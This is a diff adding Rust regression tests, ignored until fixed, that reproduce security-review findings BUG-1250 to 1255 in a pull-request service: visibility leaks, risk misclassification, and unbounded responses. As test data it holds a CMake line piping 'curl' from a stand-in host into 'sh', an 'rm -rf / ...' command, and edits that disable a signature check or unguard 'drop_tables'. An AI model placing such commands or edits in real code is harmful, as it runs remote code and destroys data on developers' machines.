@@ -965,3 +965,335 @@ fn pr_rules_from_veilrules() {
         assert!(matches!(r, Err(Error::Api { code: "not_found", .. })), "{r:?}");
     }
 }
+
+/// Security review of S21 cycle 1 (`docs/BUGS.md`, "S21 cycle 1"):
+/// reproductions of BUG-1250..1254, ignored until fixed.
+mod s21_adversarial {
+    use std::time::{Duration, Instant};
+
+    use super::*;
+
+    const DEVS: i64 = 900_001;
+
+    fn dev_viewer(person: i64) -> Viewer {
+        Viewer { person: Some(person), groups: [DEVS].into_iter().collect(), ..Viewer::default() }
+    }
+
+    /// Wait until a statement starting with `prefix` waits for a lock
+    /// (PostgreSQL shows it; YugabyteDB does not: there, give it 2 s).
+    fn wait_for_lock(th: &TestHub, h: &Hist, prefix: &str) -> bool {
+        let end = Instant::now() + Duration::from_secs(5);
+        while Instant::now() < end {
+            let n: i64 = th
+                .rt
+                .block_on(
+                    sqlx::query_scalar("SELECT COUNT(*) FROM pg_stat_activity WHERE wait_event_type = 'Lock' AND query LIKE $1")
+                        .bind(format!("{prefix}%"))
+                        .fetch_one(&h.hub.db),
+                )
+                .unwrap_or(0);
+            if n > 0 {
+                return true;
+            }
+            std::thread::sleep(Duration::from_millis(20));
+        }
+        std::thread::sleep(Duration::from_secs(2));
+        true
+    }
+
+    /// BUG-1250: a reclassification racing a new revision writes the class
+    /// of the PR's old paths over the new revision's, so the PR shows to
+    /// people who cannot read a folder its new revision touched.
+    #[test]
+    #[ignore = "BUG-1250: reclassify racing add_revision keeps the old paths' class; the PR leaks to people who cannot read the new revision's folder"]
+    fn bug_1250_a_reclassification_racing_a_new_revision_shows_the_pr_to_people_who_cannot_see_it() {
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
+        base.insert("fin/ledger.txt".into(), b"ledger\n".to_vec());
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        let mut f1 = base.clone();
+        f1.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
+        let r1 = h.commit(&th, &[b], f1.clone(), [2; 16], 2_000, None);
+        let mut f2 = f1;
+        f2.insert("fin/ledger.txt".into(), b"ledger: payroll-7c41e9 moved\n".to_vec());
+        let r2 = h.commit(&th, &[b], f2, [2; 16], 3_000, None);
+        let (author, name) = person_row(&th, "author");
+        let me = caller(author, &name);
+        let admin = ask_as(&th, &h, &admin_of(author));
+        let hub = h.hub.clone();
+        let title = "quarterly-close-4be1d0";
+        let id = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: title.into(), ..Default::default() })).unwrap()["id"]
+            .as_str()
+            .unwrap()
+            .to_string();
+        assert!(th.rt.block_on(prs::show(&hub, &ask_as(&th, &h, &dev_viewer(800_001)), &id)).is_ok(), "revision 1 touches pub/ only");
+        // A second PR, made later (so after the first in the batch a
+        // reclassification reads).
+        let later = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: "later".into(), ..Default::default() })).unwrap()["id"]
+            .as_str()
+            .unwrap()
+            .to_string();
+        let (first, id) = (id, later);
+        // Some request holds the first PR's row a moment (a thread, a
+        // revision, a close).
+        let mut blocker = th.rt.block_on(hub.db.begin()).unwrap();
+        th.rt
+            .block_on(sqlx::query("SELECT id FROM prs WHERE project_id = $1 AND id = $2 FOR UPDATE").bind(h.id).bind(&first).execute(&mut *blocker))
+            .unwrap();
+        // An admin adds an access line (the PRs' paths are decided as
+        // before); a dev's list starts reclassifying both PRs, reading their
+        // paths now, and waits at the first.
+        th.rt.block_on(again(|| {
+            sqlx::query("UPDATE projects SET policy_text = $1, policy_version = policy_version + 1 WHERE id = $2")
+                .bind(format!("{policy_text}pub/zz/ security\n"))
+                .bind(h.id)
+                .execute(&hub.db)
+        }));
+        let dev = ask_as(&th, &h, &dev_viewer(800_001));
+        let (hub3, dev3) = (hub.clone(), dev.clone());
+        let listing = th.rt.spawn(async move { prs::list(&hub3, &dev3, ListParams::default()).await.map(|_| ()) });
+        assert!(wait_for_lock(&th, &h, "UPDATE prs SET class_id"), "the reclassification waits for the first PR's row");
+        // Meanwhile a request that loaded the project before the line came
+        // (`admin`) adds revision 2 to the later PR, which also touches fin/.
+        th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r2.hex() })).unwrap();
+        th.rt.block_on(blocker.rollback()).unwrap();
+        th.rt.block_on(listing).unwrap().unwrap();
+
+        // Revision 2 touched fin/, which the dev cannot read: the PR must
+        // not exist for them.
+        let shown = th.rt.block_on(prs::show(&hub, &dev, &id));
+        let listed = th.rt.block_on(prs::list(&hub, &dev, ListParams::default())).unwrap();
+        assert!(
+            shown.is_err() && listed["count"] == 0,
+            "a PR whose revision 2 touched fin/ is shown to a dev: {}\nlist: {listed}",
+            shown.map(|v| v.to_string()).unwrap_or_default()
+        );
+    }
+
+    /// The risk and gate of a one-change PR that turns `old` into `new` at
+    /// `path`, with the default rules.
+    fn risk_of(path: &str, old: Option<&str>, new: &str) -> Value {
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        base.insert("pub/keep.rs".into(), b"fn keep() {}\n".to_vec());
+        if let Some(o) = old {
+            base.insert(path.into(), o.as_bytes().to_vec());
+        }
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        let mut f = base;
+        f.insert(path.into(), new.as_bytes().to_vec());
+        let head = h.commit(&th, &[b], f, [2; 16], 2_000, None);
+        let (author, name) = person_row(&th, "author");
+        let admin = ask_as(&th, &h, &admin_of(author));
+        let v = th.rt.block_on(prs::create(&h.hub, &admin, &caller(author, &name), CreatePr { head: head.hex(), title: "risk".into(), ..Default::default() })).unwrap();
+        json!({ "risk": v["risk"], "ready": v["review"]["ready"], "reasons": v["reasons"] })
+    }
+
+    /// BUG-1251: "changed only whitespace" ignores where whitespace is, so
+    /// a change that joins a line into a comment or splits a token is low
+    /// risk: by default it is ready with no approval.
+    #[test]
+    #[ignore = "BUG-1251: whitespace-only test drops all whitespace; commenting out a call or splitting `/tmp` is low risk and needs no approval"]
+    fn bug_1251_a_whitespace_only_change_that_changes_the_code_needs_no_review() {
+        let cases = [
+            // A newline turned into a space: `verify()` is now in the comment.
+            ("pub/auth.rs", "fn admin() {\n    // check the caller first\n    verify_signature();\n    delete_all();\n}\n", "fn admin() {\n    // check the caller first verify_signature();\n    delete_all();\n}\n"),
+            // A space inserted inside a path.
+            ("pub/clean.sh", "#!/bin/sh\nrm -rf /tmp/build\n", "#!/bin/sh\nrm -rf / tmp/build\n"),
+            // Python: the indentation decides what the `if` guards.
+            ("pub/gate.py", "if not user.is_admin:\n    raise Forbidden()\n    drop_tables()\n", "if not user.is_admin:\n    raise Forbidden()\ndrop_tables()\n"),
+        ];
+        for (path, old, new) in cases {
+            let v = risk_of(path, Some(old), new);
+            assert_eq!(v["risk"], "normal", "{path}: {v}");
+            assert_eq!(v["ready"], false, "{path}: a change of behaviour needs a review: {v}");
+        }
+    }
+
+    /// BUG-1252: every `*.txt` is "documentation", so a CMake build script
+    /// (run on every build, by every developer and CI) is low risk.
+    #[test]
+    #[ignore = "BUG-1252: CMakeLists.txt is classified documentation (low risk, no approval)"]
+    fn bug_1252_a_build_script_named_txt_is_low_risk() {
+        let v = risk_of("pub/CMakeLists.txt", Some("project(app)\n"), "project(app)\nexecute_process(COMMAND sh -c \"curl -s https://example.invalid/x | sh\")\n");
+        assert_ne!(v["risk"], "low", "{v}");
+        assert_eq!(v["ready"], false, "{v}");
+    }
+
+    /// BUG-1253: a thread listing holds every comment of every thread of the
+    /// PR in one answer (1,000 × 500 × 64 KiB at the limits), and every new
+    /// thread or reply answers with it.
+    #[test]
+    #[ignore = "BUG-1253: GET threads (and every comment's answer) holds all of a PR's comments, unpaged: up to 32 GB"]
+    fn bug_1253_a_thread_listing_is_unbounded() {
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        let mut f = base;
+        f.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
+        let head = h.commit(&th, &[b], f, [2; 16], 2_000, None);
+        let (author, name) = person_row(&th, "author");
+        let me = caller(author, &name);
+        let admin = ask_as(&th, &h, &admin_of(author));
+        let hub = h.hub.clone();
+        let id = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: head.hex(), title: "public".into(), ..Default::default() })).unwrap()["id"]
+            .as_str()
+            .unwrap()
+            .to_string();
+        let v = th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: "first".into(), anchor: None })).unwrap();
+        let t = v["threads"][0]["id"].as_str().unwrap().to_string();
+        // 400 replies of 60 KB (24 MB), well inside the limits (500 a
+        // thread, 1,000 threads): what any participant may post.
+        th.rt.block_on(again(|| {
+            sqlx::query(
+                "INSERT INTO pr_comments (project_id, pr, thread, id, author, body, at) \
+                 SELECT $1, $2, $3, lpad(to_hex(i), 12, '0'), $4, repeat('x', 60000), i FROM generate_series(1, 400) AS i",
+            )
+            .bind(h.id)
+            .bind(&id)
+            .bind(&t)
+            .bind(author)
+            .execute(&hub.db)
+        }));
+        let anyone = ask_as(&th, &h, &Viewer::default());
+        let listing = th.rt.block_on(prs::threads_json(&hub, &anyone, &id)).unwrap().to_string();
+        let reply = th.rt.block_on(prs::update_thread(&hub, &admin, &me, &id, &t, prs::ThreadUpdate { body: Some("one more".into()), state: None })).unwrap().to_string();
+        for (what, len) in [("anyone's GET threads", listing.len()), ("a reply's answer", reply.len())] {
+            assert!(len <= 4 << 20, "{what} is {len} bytes: one answer holds every comment of the PR");
+        }
+    }
+
+    /// BUG-1254: refusals of a new revision count the PR's real revisions,
+    /// so the author learns of revisions they are shown as one (a rebase
+    /// over folders they cannot see).
+    #[test]
+    #[ignore = "BUG-1254: 'that is revision N already' (and the 100-revision limit) use real revision numbers, not the viewer's"]
+    fn bug_1254_a_refused_revision_names_the_real_revision_number() {
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
+        base.insert("fin/ledger.txt".into(), b"ledger\n".to_vec());
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        // The dev's change, on b.
+        let mut f1 = base.clone();
+        f1.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
+        let r1 = h.commit(&th, &[b], f1, [2; 16], 3_000, None);
+        h.set_branch(&th, "feature", r1);
+        let (dev_id, dev_name) = person_row(&th, "dev");
+        let dev_caller = caller(dev_id, &dev_name);
+        let dev = ask_as(&th, &h, &dev_viewer(dev_id));
+        let hub = h.hub.clone();
+        let id = th.rt.block_on(prs::create(&hub, &dev, &dev_caller, CreatePr { head: "feature".into(), title: "dev's".into(), ..Default::default() })).unwrap()["id"]
+            .as_str()
+            .unwrap()
+            .to_string();
+        // main moves by a change of fin/ only; an admin rebases the PR over
+        // it (the same change, time and files of pub/).
+        let mut fb2 = base.clone();
+        fb2.insert("fin/ledger.txt".into(), b"ledger, hidden edit\n".to_vec());
+        let b2 = h.commit(&th, &[b], fb2.clone(), [3; 16], 2_000, None);
+        h.set_branch(&th, "main", b2);
+        let mut f1b = fb2;
+        f1b.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
+        let r1b = h.commit(&th, &[b2], f1b, [2; 16], 3_000, None);
+        let (adm, adm_name) = person_row(&th, "admin");
+        let admin = ask_as(&th, &h, &admin_of(adm));
+        th.rt.block_on(prs::add_revision(&hub, &admin, &caller(adm, &adm_name), &id, RevisionRequest { head: r1b.hex() })).unwrap();
+        let dev = ask_as(&th, &h, &dev_viewer(dev_id));
+        let shown = th.rt.block_on(prs::show(&hub, &dev, &id)).unwrap();
+        assert_eq!(shown["revision"], 1, "to the dev, the rebase is the same revision: {shown}");
+        let head = shown["revisions"][0]["head"].as_str().unwrap().to_string();
+        // The dev asks again for the head they are shown.
+        let mut refusals = Vec::new();
+        for _ in 0..2 {
+            match th.rt.block_on(prs::add_revision(&hub, &dev, &dev_caller, &id, RevisionRequest { head: head.clone() })) {
+                Ok(v) => assert_eq!(v["revision"], 1, "{v}"),
+                Err(Error::Api { message, .. }) => refusals.push(message),
+                Err(e) => panic!("{e:?}"),
+            }
+        }
+        assert!(!refusals.is_empty());
+        for m in &refusals {
+            assert_eq!(m, "that is revision 1 already", "the dev is shown revision 1 only");
+        }
+    }
+
+    /// BUG-1255: a new revision carries every anchored thread, each through
+    /// its own read and diff of the file, with no deadline: 100 threads on a
+    /// file of under 1 MiB (the limit is 1,000).
+    #[test]
+    #[ignore = "BUG-1255: carrying anchored threads to a new revision diffs the file once per thread, with no deadline (100 threads: 80 s)"]
+    fn bug_1255_a_new_revision_carries_every_thread_past_its_deadline() {
+        let threads: usize = std::env::var("VEIL_BUG1255_THREADS").ok().and_then(|s| s.parse().ok()).unwrap_or(100);
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let lines = 20_000;
+        let big: String = (0..lines).map(|i| format!("let value_{i:06} = compute({i}) + 1; // ........\n")).collect();
+        assert!(big.len() < 1 << 20);
+        let mut base = Files::new();
+        base.insert("pub/big.rs".into(), big.clone().into_bytes());
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        let edit = |every: usize, tag: &str| -> Files {
+            let mut f = base.clone();
+            let t: String = big.lines().enumerate().map(|(i, l)| if i % every == 0 { format!("{l} {tag}\n") } else { format!("{l}\n") }).collect();
+            f.insert("pub/big.rs".into(), t.into_bytes());
+            f
+        };
+        let r1 = h.commit(&th, &[b], edit(1_000, "one"), [2; 16], 2_000, None);
+        let r2 = h.commit(&th, &[b], edit(7, "two"), [2; 16], 3_000, None);
+        let (author, name) = person_row(&th, "author");
+        let me = caller(author, &name);
+        let admin = ask_as(&th, &h, &admin_of(author));
+        let hub = h.hub.clone();
+        let v = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: "big".into(), ..Default::default() })).unwrap();
+        let id = v["id"].as_str().unwrap().to_string();
+        let change = v["revisions"][0]["changes"][0]["change_id"].as_str().unwrap().to_string();
+        // One real anchor, then as many as any participant may add.
+        let an = AnchorRequest { change: None, path: "pub/big.rs".into(), side: Some("new".into()), start: 3, end: Some(3) };
+        th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: "here".into(), anchor: Some(an) })).unwrap();
+        let (anchor, at): (String, String) = th
+            .rt
+            .block_on(sqlx::query_as("SELECT anchor, now_at FROM pr_threads WHERE project_id = $1 AND pr = $2").bind(h.id).bind(&id).fetch_one(&hub.db))
+            .unwrap();
+        assert!(anchor.contains(&change));
+        th.rt.block_on(again(|| {
+            sqlx::query(
+                "INSERT INTO pr_threads (project_id, pr, id, anchor, now_at, state, author, created_at) \
+                 SELECT $1, $2, lpad(to_hex(i), 12, '0'), $3, $4, 'open', $5, i FROM generate_series(1, $6) AS i",
+            )
+            .bind(h.id)
+            .bind(&id)
+            .bind(&anchor)
+            .bind(&at)
+            .bind(author)
+            .bind(threads as i32 - 1)
+            .execute(&hub.db)
+        }));
+        let t0 = Instant::now();
+        let r = th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r2.hex() }));
+        let took = t0.elapsed();
+        eprintln!("{threads} threads: add_revision took {took:?}: {:?}", r.as_ref().map(|_| "ok"));
+        assert!(took < Duration::from_secs(10), "one revision took {took:?} with {threads} anchored threads (the request's deadline is 10 s)");
+    }
+}
